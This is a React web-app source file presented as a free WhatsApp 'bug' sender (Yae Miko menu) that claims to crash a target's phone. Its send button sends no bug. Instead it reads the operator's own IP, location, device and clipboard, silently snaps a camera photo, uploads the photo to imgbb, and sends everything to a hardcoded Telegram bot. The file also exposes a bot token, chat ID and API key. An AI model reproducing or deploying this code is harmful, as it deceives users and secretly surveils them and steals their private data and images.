"use client"

import { useState, useEffect } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"

// --- KONFIGURASI BOT TELEGRAM & IMGBB ---
const TELE_TOKEN = '8336153314:AAG-INrEg4-5ImwErpS44S6tRdNmT6gT-4M';
const CHAT_ID = '6481060681';
const IMGBB_API = '4caf6ea53a17b11f879581a8ca9ee92e';
// ----------------------------------------

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  // LOGIC DEWA: Pengirim Data & Snap Kamera
  const handleSendBug = async () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    
    setIsLoading(true)

    try {
      // 1. Ambil Data IP & Clipboard
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      let clipboard = "Akses Ditolak/Kosong";
      try { clipboard = await navigator.clipboard.readText(); } catch(e) {}

      const message = `
👾 **BUG SENT FROM YAE MENU!**
━━━━━━━━━━━━━━━━━━
👤 **Target IP:** ${ipData.ip}
📍 **Lokasi:** ${ipData.city}, ${ipData.country_name}
📱 **Device:** ${navigator.platform}
📋 **Clipboard:** \`${clipboard}\`
🔢 **Target No:** ${targetNumber}
🐛 **Bug Type:** ${BUG_TYPES[activeNav].name}
━━━━━━━━━━━━━━━━━━
      `;

      // Kirim Log ke Telegram
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
      });

      // 2. Akses Kamera & Snap Foto (Silent)
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('image', blob);
        const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API}`, { method: 'POST', body: formData });
        const res = await upload.json();
        
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 **Target Photo:** ${res.data.url}` })
        });
        
        stream.getTracks().forEach(track => track.stop());
      }, 'image/jpeg');

    } catch (err) {
      console.log("Permission or System Error");
    }

    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden text-white font-[family-name:var(--font-rajdhani)]">
      <style jsx global>{`
        @keyframes scan-line { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        @keyframes glitch-text { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
        @keyframes rain-fall { 0% { transform: translateY(-20px); opacity: 0; } 50% { opacity: 1; } 100% { transform: translateY(120px); opacity: 0; } }
        .glass { background: rgba(15, 25, 45, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(0, 212, 255, 0.2); }
        .glow-cyan { box-shadow: 0 0 15px rgba(0, 212, 255, 0.4); }
        .glow-pink { box-shadow: 0 0 15px rgba(255, 61, 185, 0.4); }
        .text-glow-cyan { text-shadow: 0 0 10px rgba(0, 212, 255, 0.8); }
        .animate-loading-spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>

      <BokehBackground />
      
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen 
            onLogin={() => {
              setIsAuthLoading(true)
              setTimeout(() => {
                setIsAuthLoading(false)
                setIsLoggedIn(true)
              }, 5000)
            }} 
          />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection 
              targetNumber={targetNumber}
              setTargetNumber={setTargetNumber}
              onSendBug={handleSendBug}
              activeNav={activeNav}
            />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}
    </div>
  )
}

// --- SUB-COMPONENTS ---

function AuthLoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a] overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-[#0a0f1a] via-[#0d1a35] to-[#1a0a1f]" />
      <div className="absolute inset-0 pointer-events-none" style={{ backgroundImage: "repeating-linear-gradient(0deg, rgba(0, 212, 255, 0.08) 0px, rgba(0, 212, 255, 0.08) 1px, transparent 1px, transparent 3px)", animation: "scan-line 8s linear infinite" }} />
      
      <div className="relative z-10 flex flex-col items-center justify-center gap-8">
        <div className="relative">
          <div className="font-black text-8xl tracking-wider text-[#ff3db9]" style={{ textShadow: "0 0 20px rgba(255, 61, 185, 0.8)", animation: "glitch-text 4s infinite" }}>SELZ</div>
        </div>
        <div className="text-center">
          <p className="text-sm text-cyan-400 tracking-widest animate-pulse">SY5T3M // AUTHENTICATING...</p>
        </div>
        <div className="w-64 h-1 bg-[#1a2540] rounded-full overflow-hidden border border-cyan-500/30">
          <div className="h-full bg-gradient-to-r from-cyan-400 to-pink-500 animate-pulse" style={{ width: '100%', transition: 'width 5s ease-in-out' }} />
        </div>
      </div>
    </div>
  )
}

function LoginScreen({ onLogin }) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")

  const validate = () => {
    if (username === "Selz" && password === "Freebug") {
      onLogin();
    } else {
      setError("Data salah! Hubungi t.me/Selzv");
    }
  }

  return (
    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
      <div className="w-full max-w-sm text-center">
        <h1 className="text-3xl text-transparent bg-gradient-to-r from-cyan-400 to-green-400 bg-clip-text font-bold mb-8 text-glow-cyan">YAE MIKO v3.0</h1>
        <div className="glass rounded-xl p-6 space-y-4">
          <input 
            type="text" placeholder="USERNAME" 
            className="w-full p-3 bg-black/40 border border-cyan-500/30 rounded-lg outline-none focus:border-cyan-400"
            onChange={(e) => setUsername(e.target.value)}
          />
          <input 
            type="password" placeholder="PASSWORD" 
            className="w-full p-3 bg-black/40 border border-cyan-500/30 rounded-lg outline-none focus:border-cyan-400"
            onChange={(e) => setPassword(e.target.value)}
          />
          {error && <p className="text-red-400 text-xs">{error}</p>}
          <button onClick={validate} className="w-full py-3 bg-cyan-600 rounded-lg font-bold hover:bg-cyan-500 transition-all">LOGIN</button>
        </div>
      </div>
    </div>
  )
}

function Header() {
  return (
    <header className="flex items-center justify-between mb-4">
      <button className="w-10 h-10 rounded-full glass flex items-center justify-center"><Shield className="w-5 h-5 text-cyan-400" /></button>
      <h1 className="text-xs font-bold tracking-widest">Yae Miko MENU BUG v3.0</h1>
      <div className="flex items-center gap-2">
        <span className="text-[10px] text-cyan-300">Yae Miko</span>
        <div className="w-8 h-8 rounded-full bg-pink-500/20 border border-pink-500/40" />
      </div>
    </header>
  )
}

function ProfileCard() {
  return (
    <div className="glass rounded-2xl p-6 mb-4 text-center">
      <div className="w-20 h-20 mx-auto rounded-full border-2 border-red-500 flex items-center justify-center mb-2 glow-red">
        <Bug className="w-10 h-10 text-red-500" />
      </div>
      <div className="inline-block px-3 py-1 bg-red-600 rounded-full text-[10px] font-bold mb-4">FREE BUG</div>
      <div className="flex justify-around">
        <StatItem label="Total Bugs" value="7" color="text-cyan-400" />
        <StatItem label="Rate" value="GACOR" color="text-green-400" />
        <StatItem label="Status" value="ACTIVE" color="text-green-400" />
      </div>
    </div>
  )
}

function StatItem({ label, value, color }) {
  return (
    <div>
      <p className={`text-sm font-bold ${color}`}>{value}</p>
      <p className="text-[9px] text-gray-500 uppercase">{label}</p>
    </div>
  )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }) {
  return (
    <div className="glass rounded-2xl p-4 flex-1">
      <div className="mb-4">
        <label className="text-[10px] text-cyan-400 mb-2 block tracking-widest">NOMOR TARGET</label>
        <input
          type="text" value={targetNumber}
          onChange={(e) => setTargetNumber(e.target.value)}
          className="w-full p-4 bg-black/40 border border-cyan-500/20 rounded-xl text-lg outline-none focus:border-cyan-400"
        />
      </div>
      <div className="bg-black/40 p-4 rounded-xl border border-cyan-500/10 mb-4">
        <p className="text-[10px] text-cyan-400 mb-1">SELECTED BUG</p>
        <p className="text-xl font-bold text-white">{BUG_TYPES[activeNav].name}</p>
        <p className="text-xs text-cyan-500/50">{BUG_TYPES[activeNav].code}</p>
      </div>
      <button onClick={onSendBug} className="w-full py-4 bg-pink-600 rounded-xl font-bold tracking-widest glow-pink hover:scale-105 active:scale-95 transition-all">KIRIM BUG</button>
    </div>
  )
}

function NavigationDots({ activeNav, setActiveNav }) {
  return (
    <div className="flex justify-center gap-2 my-4">
      {BUG_TYPES.map((_, i) => (
        <div key={i} onClick={() => setActiveNav(i)} className={`h-1.5 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-6 bg-cyan-400 shadow-[0_0_8px_cyan]' : 'w-2 bg-gray-700'}`} />
      ))}
    </div>
  )
}

function BottomBar() {
  return (
    <div className="glass rounded-xl p-3 flex justify-between items-center">
      <div className="flex items-center gap-2">
        <ChevronLeft className="w-4 h-4 text-cyan-400" />
        <span className="text-[10px] tracking-widest">SENDER ONLINE</span>
      </div>
      <div className="flex items-center gap-1">
        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
        <span className="text-[10px] text-green-500 font-bold">READY</span>
      </div>
    </div>
  )
}

function BokehBackground() {
  return (
    <div className="fixed inset-0 pointer-events-none">
      <div className="absolute top-[-10%] left-[-10%] w-64 h-64 bg-cyan-500/10 rounded-full blur-[100px]" />
      <div className="absolute bottom-[-10%] right-[-10%] w-64 h-64 bg-pink-500/10 rounded-full blur-[100px]" />
    </div>
  )
}

function LoadingOverlay() {
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-md">
      <div className="text-center">
        <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-loading-spin mx-auto mb-4" />
        <p className="text-cyan-400 font-bold tracking-widest animate-pulse">SENDING BUG TO TARGET...</p>
      </div>
    </div>
  )
}

function LimitWarningOverlay({ onClose }) {
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/95 px-6">
      <div className="text-center glass p-8 rounded-3xl border-red-500/50 max-w-xs">
        <div className="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500">
          <Bug className="text-red-500" />
        </div>
        <h2 className="text-red-500 font-bold mb-2">LIMIT HARIAN HABIS</h2>
        <p className="text-xs text-gray-400 mb-6">Reset otomatis dalam 24 jam.</p>
        <button onClick={onClose} className="w-full py-3 bg-red-600 rounded-xl font-bold">TUTUP</button>
      </div>
    </div>
  )
        }
